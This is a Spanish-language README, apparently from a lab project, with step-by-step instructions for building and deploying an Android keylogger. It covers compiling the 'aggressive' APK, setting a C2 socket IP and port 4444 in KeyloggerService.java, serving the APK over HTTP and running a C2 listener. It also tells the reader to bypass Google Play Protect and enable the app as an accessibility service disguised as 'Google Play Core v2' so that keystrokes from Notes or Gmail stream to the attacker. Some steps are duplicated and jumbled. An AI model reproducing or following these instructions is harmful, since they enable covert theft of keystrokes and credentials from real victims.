# 🛠️ Guía de Instalación y Despliegue (Instrucciones de Laboratorio)

Esta guía contiene los comandos exactos y el flujo técnico corregido que funcionó de manera infalible en nuestra terminal Kali Linux para configurar el entorno, aceptar las licencias de Google Android, compilar el APK agresivo (`keylogger_v2.apk`) y levantar el servidor de Comando y Control (C2).

Este archivo está listo para ser incluido en tu repositorio para que cualquiera (o tú mismo en otra máquina) pueda replicar el laboratorio sin tropezar con las licencias de Android o errores de caché.


## 🛠️ Guía de Compilación desde la Consola (CLI)

Si clonas este proyecto en un entorno limpio de Kali Linux, sigue estos pasos secuenciales dentro de la carpeta raíz del repositorio para compilar el APK sin configurar variables globales:

### 1. Preparar el Entorno Local
Descargamos e instalamos las versiones exactas y portables de Java y Gradle directamente dentro de la carpeta del proyecto:

```bash
# Asegúrate de estar en la raíz del repositorio clonado
cd tb3-keylogger

# Descargar e instalar Java 17 Portable de forma interna
wget [https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8.1%2B1/OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz](https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8.1%2B1/OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz)
tar -xzf OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz
mv jdk-17.0.8.1+1 jdk-17

# Descargar e instalar Gradle 7.5 Portable de forma interna
wget [https://services.gradle.org/distributions/gradle-7.5-bin.zip](https://services.gradle.org/distributions/gradle-7.5-bin.zip)
unzip gradle-7.5-bin.zip




---

## 📋 Requisitos Previos Generales

Como limpiamos el repositorio con `.gitignore` para no subir archivos pesados, asegúrate de contar con los componentes portátiles básicos en la raíz del proyecto (`~/proyecto_keylogger`) si clonas el proyecto en un entorno limpio:

- Una carpeta `jdk-17` (Java 17 Portable).
- Una carpeta `gradle-7.5` (Gradle Portable).
- El script `server.py` en la raíz.

---


## 🚀 Paso 1: Descarga de Herramientas de Google y Configuración del SDK

Para evitar instalar Android Studio completo, usamos las herramientas oficiales de línea de comandos de Google (`cmdline-tools`) para descargar los componentes de la plataforma Android 33 de manera ligera.

Ejecuta lo siguiente desde la raíz del proyecto (`~/proyecto_keylogger`):


```bash
1. Dentro de la carpeta del repositorio clonado:
# Asegúrate de estar dentro de la carpeta del repositorio clonado
cd ~/{carpeta donde clonaste}/tb3-keylogger

# Descargar e instalar Java 17 Portable
wget https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8.1%2B1/OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz
tar -xzf OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz
mv jdk-17.0.8.1+1 jdk-17

# Descargar e instalar Gradle 7.5 Portable
wget https://services.gradle.org/distributions/gradle-7.5-bin.zip
unzip gradle-7.5-bin.zip

=-=-==-=-=-=-=
# 1. Descargar el paquete oficial de herramientas de línea de comandos de Google
wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip

# 2. Descomprimir las herramientas en la raíz
unzip commandlinetools-linux-9477386_latest.zip

# 3. Crear el archivo local.properties para indicarle a Gradle la ruta de trabajo del SDK
echo "sdk.dir=/home/kali/android-sdk" > local.properties
```

---

## 🔑 Paso 2: Aceptación Automática de las Licencias Oficiales de Android

Este fue el punto clave del éxito. En lugar de inyectar firmas SHA-1 manualmente (las cuales Google cambia constantemente), usamos el `sdkmanager` oficial automatizado con el comando `yes` de Linux para pre-aprobar todos los términos contractuales utilizando Java portátil:

```bash
# Ejecutar el asistente de licencias oficial forzando el uso de Java 17
JAVA_HOME=/home/kali/proyecto_keylogger/jdk-17 yes | ./cmdline-tools/bin/sdkmanager --sdk_root=/home/kali/android-sdk --licenses
```

Verás pasar los textos de las licencias en la terminal y concluirá con el mensaje:

```text
All SDK package licenses accepted
```

---

## 🏗️ Paso 3: Compilación Limpia del APK Agresivo (v2.0)

Con las licencias ya validadas dentro de `/home/kali/android-sdk`, lanzamos la compilación definitiva inyectando las rutas dinámicas como variables de entorno.

```bash
# Ejecutar la compilación mediante Gradle apuntando al SDK y JDK correctos
ANDROID_HOME=/home/kali/android-sdk \
JAVA_HOME=/home/kali/proyecto_keylogger/jdk-17 \
./gradle-7.5/bin/gradle app:assembleDebug
```

Al finalizar de manera exitosa, verás el mensaje:

```text
BUILD SUCCESSFUL
```

---

## 📦 Paso 4: Clonación Evasiva y Servidor de Transferencia HTTP

Para evitar que el navegador interno de la Máquina Virtual Android utilice una versión vieja guardada en su memoria caché, nos movemos a la ruta de salida, duplicamos el archivo bajo un nombre nuevo (`keylogger_v2.apk`) y abrimos el puerto `8080`:

```bash


=-=-=-= Antes de empezar, dirigete a open foder y en el buscador ingresas para dirigirte a la carpeta kali/{carpeta donde clonaste}/tb3-keylogger/app/src/main/java/com/mimalware/keylogger/KeyloggerService.java
=-=-=-
#Eso abrira un archivo vim donde debemos buscar esta linea
- Socket socket = new Socket("TU_IP_AQUI", 4444);
- Escribes la ip de tu maquina Kali


Cambias

# 1. Navegar hasta la carpeta profunda de compilación generada por Gradle
cd app/build/outputs/apk/debug/



# 2. Duplicar el APK para romper la caché del navegador
cp app-debug.apk keylogger_v2.apk

# 3. Levantar el servidor de descargas en la red local
python3 -m http.server 8080
```

---

## 🕵️‍♂️ Paso 5: Ejecución del Servidor de Escucha C2

En una segunda terminal independiente de Kali Linux, regresa a la raíz del proyecto y levanta el socket receptor en Python:

```bash
# Regresar a la raíz e iniciar el listener TCP
┌──(kali㉿kali)-[~]
└─$ cd prueba-tb3/tb3-keylogger

cd {carpeta donde clonaste}/tb3-keylogger

python3 server.py
```

---

## 📱 Paso 6: Despliegue y Activación en la VM

### Descarga

Desde el navegador de la VM Android, ingresa a:

```text
http://{ip de tu maquina kali}:8080
```

(o la IP local de tu Kali) y descarga `keylogger_v2.apk`.

### Instalación

Instala el paquete. Si salta la alerta de Google Play Protect, selecciona:

```text
Instalar de todas formas
```

### Enganche de Accesibilidad

En tu maquina victima ve a:

```text
Ajustes > Accesibilidad > Google Play Core v2
```

Y activa el interruptor.

### Captura

Abre Notas o Gmail en el dispositivo simulado y observarás la transmisión de logs en tiempo real hacia la terminal de Kali.

---
